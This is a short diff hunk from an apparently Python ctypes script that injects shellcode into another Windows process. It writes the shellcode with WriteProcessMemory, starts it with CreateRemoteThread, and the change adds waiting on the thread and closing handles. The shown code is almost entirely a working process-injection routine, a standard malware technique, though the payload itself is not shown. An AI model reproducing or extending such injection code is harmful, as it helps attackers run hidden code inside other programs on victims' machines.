@@ -121,8 +121,11 @@ kernel32.WriteProcessMemory(
     shellcode_address,
     c_char_p(shellcode),
     len(shellcode),
-    c_ulonglong(0),
+    0,
 )
-kernel32.CreateRemoteThread(
+thread_handle = kernel32.CreateRemoteThread(
     handle_process, None, 0, shellcode_address, None, 0, byref(c_ulong(0))
 )
+kernel32.WaitForSingleObject(thread_handle, -1)
+kernel32.CloseHandle(thread_handle)
+kernel32.CloseHandle(handle_process)
